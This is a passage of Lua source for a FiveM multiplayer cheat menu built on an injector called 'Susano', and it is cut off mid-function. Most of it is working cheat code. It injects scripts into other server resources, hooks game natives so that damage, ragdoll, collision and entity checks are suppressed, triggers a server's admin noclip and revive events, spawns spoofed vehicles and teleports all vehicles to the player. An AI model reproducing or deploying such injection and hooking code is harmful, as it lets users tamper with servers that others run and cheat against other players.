    DrawInfoBar(cx, cy, contentW, barH, healthPct, hR, hG, hB, tostring(info.health) .. " / " .. tostring(info.maxHealth))
    cy = cy + barH + 5 * scale

    -- Armure
    Menu.DrawText(cx, cy, "Armure", fontSize, 0.55, 0.55, 0.55, 1.0)
    local armorPct = math.max(0, math.min(1, info.armor / 100))
    local armorPctText = tostring(info.armor) .. "%"
    if Susano and Susano.GetTextWidth then
        local tw = Susano.GetTextWidth(armorPctText, fontSize * scale)
        Menu.DrawText(panelX + panelW - pad - tw, cy, armorPctText, fontSize, 0.7, 0.7, 0.7, 1.0)
    else
        Menu.DrawText(panelX + panelW - pad - 30 * scale, cy, armorPctText, fontSize, 0.7, 0.7, 0.7, 1.0)
    end
    cy = cy + rowH * 0.65

    DrawInfoBar(cx, cy, contentW, barH, armorPct, 60, 130, 220, tostring(info.armor) .. " / 100")
    cy = cy + barH + 5 * scale

    -- =====================
    --  JOUEUR
    -- =====================
    cy = DrawSectionSep(cx, cy, contentW, "", scale, accent)

    Row("Arme", info.weapon)
    Row("Distance", tostring(info.distance) .. " m")
    Row("Direction", tostring(info.heading) .. "  ")
    local coordsStr = string.format("%.1f, %.1f, %.1f", info.coords.x, info.coords.y, info.coords.z)
    Row("Coords", coordsStr, 0.7, 0.7, 0.7)

    -- =====================
    --  VEHICULE (conditionnel)
    -- =====================
    if info.inVehicle then
        cy = DrawSectionSep(cx, cy, contentW, "", scale, accent)
        Row("Modele", info.vehicle)
        if info.vehPlate ~= "" then
            Row("Plaque", info.vehPlate)
        end
        Row("Vitesse", tostring(info.speed) .. " km/h")

        Menu.DrawText(cx, cy, "Vie Vehicule", fontSize, 0.55, 0.55, 0.55, 1.0)
        cy = cy + rowH * 0.65
        local vhPct = 0
        if info.vehMaxHealth > 0 then
            vhPct = math.max(0, math.min(1, info.vehHealth / info.vehMaxHealth))
        end
        local vhR, vhG, vhB = 76, 175, 80
        if vhPct < 0.25 then vhR, vhG, vhB = 211, 64, 60
        elseif vhPct < 0.55 then vhR, vhG, vhB = 230, 160, 40 end
        DrawInfoBar(cx, cy, contentW, barH, vhPct, vhR, vhG, vhB, tostring(info.vehHealth) .. " / " .. tostring(info.vehMaxHealth))
        cy = cy + barH + 5 * scale
    end

    -- =====================
    --  ETAT (only if active flags)
    -- =====================
    local states = {}
    if info.isAiming then states[#states + 1] = "Vise" end
    if info.isInCover then states[#states + 1] = "Couvert" end
    if info.isSprinting then states[#states + 1] = "Sprint" end
    if info.isSwimming then states[#states + 1] = "Nage" end
    if info.isFalling then states[#states + 1] = "Chute" end
    if info.isRagdoll then states[#states + 1] = "Ragdoll" end
    if info.isInvisible then states[#states + 1] = "Invisible" end

    if #states > 0 then
        cy = DrawSectionSep(cx, cy, contentW, "", scale, accent)
        Row("Action", table.concat(states, ", "))
    end

    -- Statut
    cy = DrawSectionSep(cx, cy, contentW, "", scale, accent)
    if not info.isAlive then
        Row("Statut", "Mort", 0.9, 0.2, 0.2)
    elseif info.isGodmode then
        Row("Statut", "En Vie  [GODMODE]", 1.0, 0.85, 0.0)
    else
        Row("Statut", "En Vie", 0.3, 0.9, 0.35)
    end
end




-- [REMOVED] ToggleFullGodmode (menu item deleted)
-- [REMOVED] ToggleSemiGodmode (menu item deleted)
local function SetEntityScale(entity, scale)
    if _G.SetEntityScale then
        return _G.SetEntityScale(entity, scale)
    end
    return Citizen.InvokeNative(0x25223CA6B4D20B7F, entity, scale)
end

local function ToggleTinyPlayer(enable)
    local ped = PlayerPedId()
    if enable then
        SetPedConfigFlag(ped, 223, true)
        SetEntityScale(ped, 0.5)
    else
        SetPedConfigFlag(ped, 223, false)
        SetEntityScale(ped, 1.0)
    end
end

local function HSVToRGB(h, s, v)
    local r, g, b
    local i = math.floor(h * 6)
    local f = h * 6 - i
    local p = v * (1 - s)
    local q = v * (1 - f * s)
    local t = v * (1 - (1 - f) * s)
    i = i % 6
    if i == 0 then r, g, b = v, t, p
    elseif i == 1 then r, g, b = q, v, p
    elseif i == 2 then r, g, b = p, v, t
    elseif i == 3 then r, g, b = p, q, v
    elseif i == 4 then r, g, b = t, p, v
    elseif i == 5 then r, g, b = v, p, q
    end
    return math.floor(r * 255), math.floor(g * 255), math.floor(b * 255)
end

local rainbowPaintActive = false
local function ToggleRainbowPaint(enable)
    rainbowPaintActive = enable
    if enable then
        Citizen.CreateThread(function()
            local hue = 0.0
            while rainbowPaintActive do
                local ped = PlayerPedId()
                if IsPedInAnyVehicle(ped, false) then
                    local veh = GetVehiclePedIsIn(ped, false)

                    hue = hue + 0.01
                    if hue > 1.0 then hue = 0.0 end

                    local r, g, b = HSVToRGB(hue, 1.0, 1.0)

                    SetVehicleCustomPrimaryColour(veh, r, g, b)
                    SetVehicleCustomSecondaryColour(veh, r, g, b)
                end
                Citizen.Wait(10)
            end
        end)
    end
end

local function ToggleAntiHeadshot(enable)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then 
        return 
    end
    
    local code = string.format([[
        local susano = rawget(_G, "Susano")
        
        if _G.AntiHeadshotEnabled == nil then _G.AntiHeadshotEnabled = false end
        _G.AntiHeadshotEnabled = %s
        
        if not _G.AntiHeadshotHooksInstalled and susano and type(susano.HookNative) == "function" then
            _G.AntiHeadshotHooksInstalled = true
            
            susano.HookNative(0x2D343D2219CD027A, function(ped, toggle)
                if _G.AntiHeadshotEnabled and ped == PlayerPedId() and toggle == true then
                    return false
                end
                return true
            end)
            
            susano.HookNative(0xD75960F6BD9EA49C, function(ped, bonePtr)
                return true
            end)
        end
        
        if not _G.AntiHeadshotLoopStarted then
            _G.AntiHeadshotLoopStarted = true
            Citizen.CreateThread(function()
                while true do
                    Wait(0)
                    if _G.AntiHeadshotEnabled then
                        local ped = PlayerPedId()
                        SetPedSuffersCriticalHits(ped, false)
                    end
                end
            end)
        end
    ]], tostring(enable))
    
    Susano.InjectResource("any", code)
end

local noclipVersion = 0

local function ToggleNoclipStaff(enable)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end

    if enable then
        Susano.InjectResource("Putin", [[
            if AdminSystem and AdminSystem.NoClip and AdminSystem.NoClip.Enable then
                AdminSystem.NoClip.Enable()
            end
        ]])
    else
        Susano.InjectResource("Putin", [[
            if AdminSystem and AdminSystem.NoClip and AdminSystem.NoClip.Disable then
                AdminSystem.NoClip.Disable()
            end
        ]])
    end
end

local function ToggleNoclip(enable, speed)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then 
        return 
    end
    
    speed = speed or 1.0
    
    noclipVersion = noclipVersion + 1
    local currentVersion = noclipVersion
    
    local code = string.format([[
        local susano = rawget(_G, "Susano")
        
        _G.NoclipEnabled = %s
        _G.NoclipSpeed = %s
        _G.NoclipVersion = %s
        
        if not _G.NoclipEnabled then
            _G.NoclipStopAll = true
            Wait(100)
            local ped = PlayerPedId()
            if DoesEntityExist(ped) then
                SetEntityCollision(ped, true, true)
                FreezeEntityPosition(ped, false)
                
                local vehicle = GetVehiclePedIsIn(ped, false)
                if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                    SetEntityCollision(vehicle, true, true)
                    FreezeEntityPosition(vehicle, false)
                end
            end
            Wait(100)
            _G.NoclipStopAll = false
            _G.NoclipEnabled = false
        else
        if not _G.NoclipHooksInstalled and susano and type(susano.HookNative) == "function" then
            _G.NoclipHooksInstalled = true
            
            susano.HookNative(0xC5F68BE37759D056, function(entity) 
                if _G.NoclipEnabled then
                    local ped = PlayerPedId()
                    if entity == ped then
                        return false
                    end
                    local vehicle = GetVehiclePedIsIn(ped, false)
                    if vehicle and vehicle ~= 0 and entity == vehicle then
                        return false
                    end
                end
                return true
            end)
        end
        
            CreateThread(function()
                local myVersion = %s
                local mySpeed = %s
                
                while true do
                    Wait(0)
                    
                    if _G.NoclipStopAll or ( _G.NoclipVersion and _G.NoclipVersion ~= myVersion) or not _G.NoclipEnabled then
                        local ped = PlayerPedId()
                        if DoesEntityExist(ped) then
                            SetEntityCollision(ped, true, true)
                            FreezeEntityPosition(ped, false)
                            
                            local vehicle = GetVehiclePedIsIn(ped, false)
                            if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                                SetEntityCollision(vehicle, true, true)
                                FreezeEntityPosition(vehicle, false)
                            end
                        end
                        _G.NoclipEnabled = false
                        break
                    end
                    
                    local ped = PlayerPedId()
                    if not DoesEntityExist(ped) then
                        Wait(100)
                    else
                        local vehicle = GetVehiclePedIsIn(ped, false)
                        local entity = vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) and vehicle or ped
                        
                        SetEntityCollision(entity, false, false)
                        FreezeEntityPosition(entity, true)
                        
                        local coords = GetEntityCoords(entity)
                        local camRot = GetGameplayCamRot(2)
                        
                        local pitch = math.rad(camRot.x)
                        local yaw = math.rad(camRot.z)
                        
                        local vx = -math.sin(yaw) * math.abs(math.cos(pitch))
                        local vy = math.cos(yaw) * math.abs(math.cos(pitch))
                        local vz = math.sin(pitch)
                        
                        local rx = math.cos(yaw)
                        local ry = math.sin(yaw)
                        
                        local currentSpeed = mySpeed
                        if _G and _G.NoclipSpeed then
                            currentSpeed = _G.NoclipSpeed
                        end
                        
                        local moveSpeed = currentSpeed
                        if IsControlPressed(0, 21) or IsDisabledControlPressed(0, 21) then
                            moveSpeed = currentSpeed * 2.5
                        end
                        
                        local newPos = coords
                        
                        if IsControlPressed(0, 32) then
                            newPos = vector3(newPos.x + vx * moveSpeed, newPos.y + vy * moveSpeed, newPos.z + vz * moveSpeed)
                        end
                        if IsControlPressed(0, 33) then
                            newPos = vector3(newPos.x - vx * moveSpeed, newPos.y - vy * moveSpeed, newPos.z - vz * moveSpeed)
                        end
                        if IsControlPressed(0, 34) then
                            newPos = vector3(newPos.x - rx * moveSpeed, newPos.y - ry * moveSpeed, newPos.z)
                        end
                        if IsControlPressed(0, 35) then
                            newPos = vector3(newPos.x + rx * moveSpeed, newPos.y + ry * moveSpeed, newPos.z)
                        end
                        
                        if IsControlPressed(0, 22) then
                            newPos = vector3(newPos.x, newPos.y, newPos.z + moveSpeed)
                        end
                        if IsControlPressed(0, 36) then
                            newPos = vector3(newPos.x, newPos.y, newPos.z - moveSpeed)
                        end
                        
                        SetEntityCoordsNoOffset(entity, newPos.x, newPos.y, newPos.z, true, true, true)
                        if entity == ped then
                            SetEntityHeading(ped, camRot.z)
                        end
                    end
                end
            end)
        end
    ]], tostring(enable), tostring(speed), tostring(currentVersion), tostring(currentVersion), tostring(speed))
    
    Susano.InjectResource("any", code)
end

function Menu.ActionRevive()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then 
        local ped = PlayerPedId()
        if not ped or not DoesEntityExist(ped) then return end
        
        local coords = GetEntityCoords(ped)
        local heading = GetEntityHeading(ped)
        
        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
        SetEntityHealth(ped, 200)
        return 
    end
    
    Susano.InjectResource("any", [[
        local function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then return end
            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
        end
        
        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
        hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
        hNative("NetworkResurrectLocalPlayer", function(originalFn, ...) return originalFn(...) end)
        hNative("SetEntityHealth", function(originalFn, ...) return originalFn(...) end)
        
        local ped = PlayerPedId()
        if not ped or not DoesEntityExist(ped) then return end
        
        local coords = GetEntityCoords(ped)
        local heading = GetEntityHeading(ped)
        
        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
        SetEntityHealth(ped, 200)
        ClearPedBloodDamage(ped)
        ClearPedTasksImmediately(ped)
        SetPlayerInvincible(PlayerId(), false)
        SetEntityInvincible(ped, false)
        SetPedCanRagdoll(ped, true)
        SetPedCanRagdollFromPlayerImpact(ped, true)
        SetPedRagdollOnCollision(ped, true)
        
        if GetResourceState("scripts") == 'started' then
            TriggerEvent('deathscreen:revive')
        end
        
        if GetResourceState("framework") == 'started' then
            TriggerEvent('deathscreen:revive')
        end
        
        if GetResourceState("qb-jail") == 'started' then
            TriggerEvent('hospital:client:Revive')
        end
    ]])
end

function Menu.ActionMaxHealth()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then 
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            SetEntityHealth(ped, 200)
        end
        return 
    end
    
    Susano.InjectResource("any", [[
        local function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then return end
            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
        end
        
        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
        hNative("SetEntityHealth", function(originalFn, ...) return originalFn(...) end)
        
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            SetEntityHealth(ped, 200)
        end
    ]])
end

function Menu.ActionMaxArmor()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then 
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            SetPedArmour(ped, 100)
        end
        return 
    end
    
    Susano.InjectResource("any", [[
        local function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then return end
            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
        end
        
        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
        hNative("SetPedArmour", function(originalFn, ...) return originalFn(...) end)
        
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            SetPedArmour(ped, 100)
        end
    ]])
end

function Menu.ActionDetachAllEntitys()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then 
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            ClearPedTasks(ped)
            DetachEntity(ped, true, true)
        end
        return 
    end
    
    Susano.InjectResource("any", [[
        local function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then return end
            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
        end
        
        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
        hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
        hNative("DetachEntity", function(originalFn, ...) return originalFn(...) end)
        
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            ClearPedTasks(ped)
            DetachEntity(ped, true, true)
        end
    ]])
end

local function ToggleSoloSession(enable)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then 
        if enable then
            NetworkStartSoloTutorialSession()
        else
            NetworkEndTutorialSession()
        end
        return 
    end
    
    local code = string.format([[
        local function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then return end
            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
        end
        
        hNative("NetworkStartSoloTutorialSession", function(originalFn, ...) return originalFn(...) end)
        hNative("NetworkEndTutorialSession", function(originalFn, ...) return originalFn(...) end)
        
        if %s then
            NetworkStartSoloTutorialSession()
        else
            NetworkEndTutorialSession()
        end
    ]], tostring(enable))
    
    Susano.InjectResource("any", code)
end



local function ToggleFastRun(enable)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then 
        return 
    end
    
    local code = string.format([[
        if _G.FastRunActive == nil then _G.FastRunActive = false end
        _G.FastRunActive = %s
        
        if not _G.FastRunLoopStarted then
            _G.FastRunLoopStarted = true
            Citizen.CreateThread(function()
                while true do
                    Wait(0)
                    if _G.FastRunActive then
                        local ped = PlayerPedId()
                        if ped and ped ~= 0 then
                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
                            SetPedMoveRateOverride(ped, 1.49)
                        end
                    else
                        Wait(500)
                    end
                end
            end)
        end
        
        if not _G.FastRunActive then
            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
            SetPedMoveRateOverride(PlayerPedId(), 1.0)
        end
    ]], tostring(enable))
    
    Susano.InjectResource("any", code)
end


local function ToggleNoRagdoll(enable)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then 
        return 
    end
    
    local code = string.format([[
        local susano = rawget(_G, "Susano")
        
        if _G.NoRagdollEnabled == nil then _G.NoRagdollEnabled = false end
        _G.NoRagdollEnabled = %s
        
        if not _G.NoRagdollHooksInstalled and susano and type(susano.HookNative) == "function" then
            if susano.HasNativeHookInitializationFailed and susano.HasNativeHookInitializationFailed() then
                return
            end
            
            _G.NoRagdollHooksInstalled = true
            
            susano.HookNative(0xAE99FB955581844A, function(ped)
                if _G.NoRagdollEnabled and ped == PlayerPedId() then
                    return false
                end
                return true
            end)
            
            susano.HookNative(0xD76632D99E4966C8, function(ped)
                if _G.NoRagdollEnabled and ped == PlayerPedId() then
                    return false
                end
                return true
            end)
        end
        
        if not _G.NoRagdollLoopStarted then
            _G.NoRagdollLoopStarted = true
            Citizen.CreateThread(function()
                while true do
                    Wait(0)
                    if _G.NoRagdollEnabled then
                        local ped = PlayerPedId()
                        if ped and ped ~= 0 then
                            SetPedCanRagdoll(ped, false)
                            SetPedRagdollOnCollision(ped, false)
                            SetPedCanRagdollFromPlayerImpact(ped, false)
                            if IsPedRagdoll(ped) then
                                ClearPedTasksImmediately(ped)
                            end
                        end
                    else
                        Wait(500)
                        local ped = PlayerPedId()
                        if ped and ped ~= 0 then
                            SetPedCanRagdoll(ped, true)
                            SetPedRagdollOnCollision(ped, true)
                            SetPedCanRagdollFromPlayerImpact(ped, true)
                        end
                    end
                end
            end)
        end
    ]], tostring(enable))
    
    Susano.InjectResource("any", code)
end

function Menu.ActionRandomOutfit()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then 
        local ped = PlayerPedId()
        if not ped or not DoesEntityExist(ped) then return end
        
        local torsoMax = GetNumberOfPedDrawableVariations(ped, 11)
        local shoesMax = GetNumberOfPedDrawableVariations(ped, 6)
        local pantsMax = GetNumberOfPedDrawableVariations(ped, 4)
        
        SetPedComponentVariation(ped, 11, math.random(0, torsoMax - 1), 0, 2)
        SetPedComponentVariation(ped, 6, math.random(0, shoesMax - 1), 0, 2)
        SetPedComponentVariation(ped, 8, 15, 0, 2)
        SetPedComponentVariation(ped, 3, 0, 0, 2)
        SetPedComponentVariation(ped, 4, math.random(0, pantsMax - 1), 0, 2)
        
        ClearPedProp(ped, 0)
        ClearPedProp(ped, 1)
        return
    end
    
    Susano.InjectResource("any", [[
        local ped = PlayerPedId()
        if not ped or not DoesEntityExist(ped) then return end
        
        local function GetRandomVariation(component, exclude)
            local total = GetNumberOfPedDrawableVariations(ped, component)
            if total <= 1 then return 0 end
            local choice = exclude
            while choice == exclude do
                choice = math.random(0, total - 1)
            end
            return choice
        end
        
        local function GetRandomComponent(component)
            local total = GetNumberOfPedDrawableVariations(ped, component)
            return total > 1 and math.random(0, total - 1) or 0
        end
        
        SetPedComponentVariation(ped, 11, GetRandomVariation(11, 15), 0, 2)
        SetPedComponentVariation(ped, 6, GetRandomVariation(6, 15), 0, 2)
        SetPedComponentVariation(ped, 8, 15, 0, 2)
        SetPedComponentVariation(ped, 3, 0, 0, 2)
        SetPedComponentVariation(ped, 4, GetRandomComponent(4), 0, 2)
        
        local face = math.random(0, 45)
        local skin = math.random(0, 45)
        SetPedHeadBlendData(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)
        
        local hairMax = GetNumberOfPedDrawableVariations(ped, 2)
        local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
        SetPedComponentVariation(ped, 2, hair, 0, 2)
        SetPedHairColor(ped, 0, 0)
        
        local brows = GetNumHeadOverlayValues(2)
        SetPedHeadOverlay(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
        SetPedHeadOverlayColor(ped, 2, 1, 0, 0)
        
        ClearPedProp(ped, 0)
        ClearPedProp(ped, 1)
    ]])
end

local function SetPedClothing(componentId, drawableId, textureId)
    local ped = PlayerPedId()
    if ped and DoesEntityExist(ped) then
        SetPedComponentVariation(ped, componentId, drawableId or 0, textureId or 0, 0)
    end
end

local function SetPedAccessory(propId, drawableId, textureId)
    local ped = PlayerPedId()
    if ped and DoesEntityExist(ped) then
        if drawableId == -1 or not drawableId then
            ClearPedProp(ped, propId)
        else
            SetPedPropIndex(ped, propId, drawableId, textureId or 0, true)
        end
    end
end


function Menu.ActionTPAllVehiclesToMe()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            local myCoords = GetEntityCoords(playerPed)
            
            local function reqCtrl(entity)
                if not DoesEntityExist(entity) then return false end
                if not NetworkGetEntityIsNetworked(entity) then return true end

                    local attempts = 0
                NetworkRequestControlOfEntity(entity)
                while not NetworkHasControlOfEntity(entity) and attempts < 20 do
                    NetworkRequestControlOfEntity(entity)
                        Wait(0)
                        attempts = attempts + 1
                    end
                    return NetworkHasControlOfEntity(entity)
            end
            
            CreateThread(function()
                local vehicles = GetGamePool("CVehicle")
                local currentVehicle = GetVehiclePedIsIn(playerPed, false)
                local count = 0

                for _, vehicle in ipairs(vehicles) do
                    if DoesEntityExist(vehicle) and vehicle ~= currentVehicle then
                        SetEntityAsMissionEntity(vehicle, true, true)
                        if reqCtrl(vehicle) then
                            local offsetX = (count % 4) * 3.0 - 4.5
                            local offsetY = math.floor(count / 4) * 3.0 + 3.0

                            SetEntityCoordsNoOffset(vehicle, myCoords.x + offsetX, myCoords.y + offsetY, myCoords.z, false, false, false)
                            SetVehicleOnGroundProperly(vehicle)
                            count = count + 1
                        end
                    end
                end
            end)
        ]])
    end
end

function Menu.ActionTPToWaypoint()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            
            local waypointBlip = GetFirstBlipInfoId(8)
            if waypointBlip ~= 0 then
                local waypointX, waypointY, waypointZ = table.unpack(GetBlipInfoIdCoord(waypointBlip))
                
                local found, groundZ = GetGroundZFor_3dCoord(waypointX, waypointY, waypointZ + 100.0, false)
                
                if found then
                    SetEntityCoordsNoOffset(playerPed, waypointX, waypointY, groundZ + 1.0, false, false, false)
                else
                    SetEntityCoordsNoOffset(playerPed, waypointX, waypointY, waypointZ, false, false, false)
                end
            end
        ]])
    end
end

function Menu.ActionTPToFIB()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            SetEntityCoordsNoOffset(playerPed, 135.733, -749.339, 258.152, false, false, false)
        ]])
    end
end

function Menu.ActionTPToMissionRowPD()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            SetEntityCoordsNoOffset(playerPed, 425.1, -979.5, 30.7, false, false, false)
        ]])
    end
end

function Menu.ActionTPToPillboxHospital()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            SetEntityCoordsNoOffset(playerPed, 298.2, -584.5, 43.3, false, false, false)
        ]])
    end
end

function Menu.ActionTPToGroveStreet()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            SetEntityCoordsNoOffset(playerPed, 85.0, -1960.0, 20.8, false, false, false)
        ]])
    end
end

function Menu.ActionTPToLegionSquare()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            SetEntityCoordsNoOffset(playerPed, 195.0, -933.0, 30.7, false, false, false)
        ]])
    end
end

local function SpawnVehicle(modelName)
    if not modelName then return end

    
    Actions.tpItem = FindItem("Vehicle", "Spawn", "Teleport Into")
    local shouldTeleport = Actions.tpItem and Actions.tpItem.value or false
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then 
         Susano.InjectResource("any", string.format([[ 
             local susano = rawget(_G, "Susano") 
             
             
             if susano and type(susano) == "table" and type(susano.HookNative) == "function" then 
                 
                 susano.HookNative(0x2B40A976, function(entity) return true end) 
                 
                 susano.HookNative(0x5324A0E3E4CE3570, function(entity) return true end) 
                 
                 susano.HookNative(0x8DE82BC774F3B862, function() return true end) 
                 
                 susano.HookNative(0x2B1813BA58063D36, function() return true end) 
                 
                 
                 susano.HookNative(0x35FB78DC42B7BD21, function(modelHash) return false, true end) 
                 
                 susano.HookNative(0x392C8D8E07B70EFC, function(modelHash) return false, true end) 
                  
                 susano.HookNative(0x98A4EB5D89A0C952, function(modelHash) return false, true end) 
                 
                 susano.HookNative(0x963D27A58DF860AC, function(modelHash) return false end) 
                  
                 susano.HookNative(0xEA386986E786A54F, function(vehicle) return false end) 
                 
                  
                 susano.HookNative(0xAE3CBE5BF394C9C9, function(entity) 
                     local entityType = GetEntityType(entity) 
                     if entityType == 2 then 
                         return false 
                     end 
                     return true 
                 end) 
                 
                 
                 susano.HookNative(0x7D9EFB7AD6B19754, function(vehicle, toggle) return false end) 
                  
                 susano.HookNative(0x1CF38D529D7441D9, function(vehicle, toggle) return false end) 
                 
                 susano.HookNative(0x99AD4CCCB128CBC9, function(vehicle) return false end) 
                  
                 susano.HookNative(0xE5810AC70602F2F5, function(vehicle, speed) return false end) 
             end 
             
             
             Citizen.CreateThread(function() 
                 Wait(1000) 
                 
                 local ped = PlayerPedId() 
                 local coords = GetEntityCoords(ped) 
                 local heading = GetEntityHeading(ped) 
                 local offsetX = coords.x + math.sin(math.rad(heading)) * 3.0 
                 local offsetY = coords.y + math.cos(math.rad(heading)) * 3.0 
                 local offsetZ = coords.z 
                 
                 local modelHash = GetHashKey("%s") 
                 if modelHash == 0 then 
                     return 
                 end 
                 
                 RequestModel(modelHash) 
                 local timeout = 0 
                 while not HasModelLoaded(modelHash) and timeout < 200 do 
                     Citizen.Wait(10) 
                     timeout = timeout + 1 
                 end 
                 
                 if HasModelLoaded(modelHash) then 
                     Citizen.Wait(200) 
                     
                     local groundZ = offsetZ 
                     local found, ground = GetGroundZFor_3dCoord(offsetX, offsetY, offsetZ + 10.0, groundZ, false) 
                     if found then 
                         offsetZ = groundZ + 0.5 
                     end 
                     
                     local vehicle = Susano.CreateSpoofedVehicle(modelHash, offsetX, offsetY, offsetZ, heading, true, true, false) 
                     if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then 
                         local netId = NetworkGetNetworkIdFromEntity(vehicle) 
                         if netId and netId ~= 0 then 
                             SetNetworkIdCanMigrate(netId, false) 
                             SetNetworkIdExistsOnAllMachines(netId, true) 
                         end 
                         SetEntityAsMissionEntity(vehicle, true, true) 
                         SetVehicleHasBeenOwnedByPlayer(vehicle, true) 
                         SetVehicleNeedsToBeHotwired(vehicle, false) 
                         SetVehicleEngineOn(vehicle, true, true, false) 
                         SetVehicleOnGroundProperly(vehicle) 
                         
                         if %s then
                             Citizen.Wait(300) 
                             TaskWarpPedIntoVehicle(ped, vehicle, -1) 
                         end
                         
                         SetModelAsNoLongerNeeded(modelHash) 
                     end 
                 end 
             end) 
         ]], modelName, tostring(shouldTeleport))) 
     end
end


local function MaxUpgrade()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local susano = rawget(_G, "Susano")
            
            if susano and type(susano) == "table" and type(susano.HookNative) == "function" and not _max_upgrade_hooks_applied then
                _max_upgrade_hooks_applied = true
                
                susano.HookNative(0x8DE82BC774F3B862, function(entity)
                    return true
                end)
                
                susano.HookNative(0x4CEBC1ED31E8925E, function(entity)
                    return true
                end)
                
                susano.HookNative(0xAE3CBE5BF394C9C9, function(entity)
                    return true
                end)
                
                susano.HookNative(0x2B40A976, function(entity)
                    return true
                end)
                
                susano.HookNative(0xAD738C3085FE7E11, function(entity, p1, p2)
                    return true
                end)
            end
            
            CreateThread(function()
                Wait(100)
                
                local ped = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(ped, false)
                
                if not vehicle or vehicle == 0 then
                    return
                end
                
                if not NetworkHasControlOfEntity(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(vehicle) and timeout < 200 do
                        Wait(10)
                        timeout = timeout + 1
                        NetworkRequestControlOfEntity(vehicle)
                    end
                end
                
                SetEntityAsMissionEntity(vehicle, true, true)
                
                SetVehicleModKit(vehicle, 0)
                
                SetVehicleWheelType(vehicle, 7)
                
                for modType = 0, 16 do
                    local numMods = GetNumVehicleMods(vehicle, modType)
                    if numMods and numMods > 0 then
                        SetVehicleMod(vehicle, modType, numMods - 1, false)
                    end
                end
                
                SetVehicleMod(vehicle, 14, 16, false)
                
                local numLivery = GetNumVehicleMods(vehicle, 15)
                if numLivery and numLivery > 1 then
                    SetVehicleMod(vehicle, 15, numLivery - 2, false)
                end
                
                for modType = 17, 22 do
                    ToggleVehicleMod(vehicle, modType, true)
                end
                
                SetVehicleMod(vehicle, 23, 1, false)
                SetVehicleMod(vehicle, 24, 1, false)
                
                for extra = 1, 12 do
